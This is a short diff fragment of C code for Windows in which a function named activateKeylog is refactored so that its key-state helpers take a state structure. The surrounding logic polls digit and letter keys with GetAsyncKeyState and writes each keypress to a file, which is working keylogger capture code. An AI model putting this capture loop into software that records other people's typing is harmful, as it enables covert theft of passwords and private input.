@@ -138,12 +138,12 @@ DWORD WINAPI activateKeylog(LPVOID param)
 		for (int i = 0; i <= 9; ++i) {
 			int vk_code = 48 + i;
 			int index = 11 + i;
-			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index)) {
+			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &KeyDownStates)) {
 				fprintf(fp, "[%d]\n", i);
 				fflush(fp);
-				setKeyDown(index);
+				setKeyDown(index, &KeyDownStates);
 			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
-				clearKeyDown(index);
+				clearKeyDown(index, &KeyDownStates);
 			}
 		}
 
@@ -151,12 +151,12 @@ DWORD WINAPI activateKeylog(LPVOID param)
 		for (int i = 0; i <= 25; ++i) {
 			int vk_code = 65 + i;
 			int index = 21 + i;
-			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index)) {
+			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &KeyDownStates)) {
 				fprintf(fp, "[%c]\n", (char)('A' + i));
 				fflush(fp);
-				setKeyDown(index);
+				setKeyDown(index, &KeyDownStates);
 			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
-				clearKeyDown(index);
+				clearKeyDown(index, &KeyDownStates);
 			}
 		}
 
